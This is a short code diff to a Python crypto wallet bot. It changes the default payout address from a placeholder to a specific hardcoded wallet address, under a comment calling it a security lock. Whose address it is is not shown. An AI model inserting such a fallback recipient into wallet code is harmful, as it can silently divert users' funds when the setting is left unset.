@@ -19,7 +19,7 @@ w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
 Account.enable_unaudited_hdwallet_features()
 
 # 🛡️ SECURITY LOCK: The bot will ONLY ever withdraw to this address.
-PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0xYourSecureExternalWalletAddress")
+PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")
 
 def get_vault():
     seed = os.getenv("WALLET_SEED")
